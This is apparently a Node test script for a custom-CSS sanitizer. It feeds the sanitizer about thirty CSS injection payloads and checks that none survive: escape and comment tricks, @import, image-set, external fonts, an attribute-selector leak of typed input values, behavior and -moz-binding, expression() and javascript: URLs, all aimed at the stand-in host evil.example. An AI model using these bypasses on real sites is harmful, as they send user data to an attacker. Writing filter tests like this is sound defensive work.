// Tests the custom-CSS safety check (public/js/lx/css-safety.js) against ways of sneaking an outside request past it.
// The oracle reads each result the way a browser does (escapes decoded once, comments dropped) and fails if any
// fetching call or @import survives with anything but a data: image or font. Run: node scripts/test-css-safety.mjs

import { sanitizeCss, CssSafetyError } from "../public/js/lx/css-safety.js";

const SAFE = /^data:(image\/(png|jpeg|webp|gif|avif|svg\+xml)|font\/(woff2?|ttf|otf)|application\/(font-woff2?|x-font-ttf|x-font-otf))[;,]/i;

// How a browser's tokenizer reads escapes: once, left to right; a hex escape eats one whitespace after it.
function browserDecode(css) {
  return css.replace(/\\(?:([0-9a-f]{1,6})[ \t\r\n\f]?|([\s\S]))/gi, (whole, hex, char) => {
    if (!hex) return char === "\n" ? "" : char;
    const code = parseInt(hex, 16);
    return code > 0 && code <= 0x10ffff ? String.fromCodePoint(code) : "�";
  });
}

// Every fetch-capable construct left in the CSS as a browser sees it, with its argument.
function fetches(css) {
  const seen = browserDecode(css).replace(/\/\*[\s\S]*?(\*\/|$)/g, "");
  const found = [];
  for (const match of seen.matchAll(/(?<![-\w])(url|image-set|-webkit-image-set|src|expression)\s*\(\s*(?:"([^"]*)"|'([^']*)'|([^)]*))/gi)) {
    const arg = (match[2] ?? match[3] ?? match[4] ?? "").trim();
    if (match[1].toLowerCase() === "url" && SAFE.test(arg)) continue;
    found.push(`${match[1]}(${arg})`);
  }
  for (const match of seen.matchAll(/@import[^;]*/gi)) found.push(match[0]);
  for (const match of seen.matchAll(/(behavior|-moz-binding)\s*:|javascript\s*:/gi)) found.push(match[0]);
  return found;
}

const ATTACKS = [
  ["plain url()", "a{background:url(https://evil.example/1)}"],
  ["upper case, quoted, spaced", 'a{background:URL( "https://evil.example/2" )}'],
  ["one escaped letter", "a{background:u\\72l(https://evil.example/3)}"],
  ["every letter escaped", "a{background:\\75\\72\\6c(https://evil.example/4)}"],
  ["six-digit escape", "a{background:u\\000072l(https://evil.example/5)}"],
  ["non-hex escape", "a{background:ur\\l(https://evil.example/6)}"],
  ["comment inside the name", "a{background:u/**/rl(https://evil.example/7)}"],
  ["comment inside the argument", "a{background:url(/*x*/https://evil.example/8)}"],
  ["kept escape absorbing a decoded digit", "a{background:\\7\\35 rl(https://evil.example/9)}"],
  ["escaped backslash before hex", "a{background:\\\\75rl(https://evil.example/10)}"],
  ["decoded slash making a comment", "a{background:\\2f* \" */ url(https://evil.example/11) /* \" */}"],
  ["back to back after a safe url", "a{background:url(data:image/png;base64,AAAA)url(https://evil.example/12)}"],
  ["escaped quote in the string", 'a{background:url("https://evil.example/13\\")")}'],
  ["unterminated", "a{background:url(https://evil.example/14"],
  ["@import string", '@import "https://evil.example/15.css";'],
  ["@import escaped", "@\\69mport url(https://evil.example/16.css);"],
  ["escaped @", "\\@import url(https://evil.example/17.css);"],
  ["image-set", 'a{background:image-set("https://evil.example/18.png" 1x)}'],
  ["-webkit-image-set", 'a{background:-webkit-image-set("https://evil.example/19.png" 1x)}'],
  ["image-set with url()", "a{background:image-set(url(https://evil.example/20.png) 1x)}"],
  ["src()", 'a{background:src("https://evil.example/21.png")}'],
  ["font from outside", "@font-face{font-family:x;src:url(https://evil.example/22.woff2)}"],
  ["attribute-selector leak", 'input[value^="a"]{background:url(https://evil.example/?a)}'],
  ["custom property", ":root{--x:url(https://evil.example/24)}"],
  ["behavior", "a{behavior:url(https://evil.example/25.htc)}"],
  ["-moz-binding", "a{-moz-binding:url(https://evil.example/26.xml#x)}"],
  ["expression", "a{width:expression(alert(1))}"],
  ["javascript: url", "a{background:url(javascript:alert(1))}"],
  ["protocol-relative", "a{background:url(//evil.example/29)}"],
  ["same-site path", "a{background:url(/api/v1/notes)}"],
];

const KEPT = [
  ["data: image", 'a{background:url("data:image/svg+xml;utf8,<svg xmlns=\'http://www.w3.org/2000/svg\'/>")}'],
  ["data: font", "@font-face{font-family:x;src:url(data:font/woff2;base64,AAAA) format('woff2')}"],
  ["plain theme CSS", ':root { --m-right: #7fc8ff; }\n[data-part="study-card"] { border-radius: 32px; }'],
  ["content escapes", 'q::before { content: "\\201C"; } p::after { content: "\\a"; }'],
  ["names that only contain the words", '.my-url-icon { --icon-src: none; } [data-image-set="x"] { color: red; }'],
];

let failed = 0;
const report = (ok, label, detail) => {
  if (!ok) failed++;
  console.log(`${ok ? "ok  " : "FAIL"}  ${label}${detail ? `: ${detail}` : ""}`);
};

// Some inputs only look like attacks (a browser reads u/**/rl( as two names); they must stay harmless all the same.
for (const [label, css] of ATTACKS) {
  const { css: out, removed } = sanitizeCss(css);
  const left = fetches(out);
  const real = fetches(css).length > 0;
  const what = removed.map((r) => r.what).join(", ") || "nothing to remove";
  report(left.length === 0 && (!real || removed.length > 0), `blocks ${label}${real ? "" : " (harmless as written)"}`, left.length ? `left ${left.join(", ")} in ${JSON.stringify(out)}` : what);
}

for (const [label, css] of KEPT) {
  const { css: out, removed } = sanitizeCss(css);
  const before = browserDecode(css);
  const after = browserDecode(out);
  report(fetches(out).length === 0 && after === before && removed.length === 0, `keeps ${label}`, after === before ? "" : `changed to ${JSON.stringify(out)}`);
}

try {
  sanitizeCss("a{}".repeat(40_000));
  report(false, "rejects CSS over 100 KB");
} catch (error) {
  report(error instanceof CssSafetyError, "rejects CSS over 100 KB", error.message);
}

console.log(`\n${failed ? `${failed} FAILED` : "all passed"} (${ATTACKS.length} attacks, ${KEPT.length} kept, 1 limit)`);
process.exit(failed ? 1 : 0);
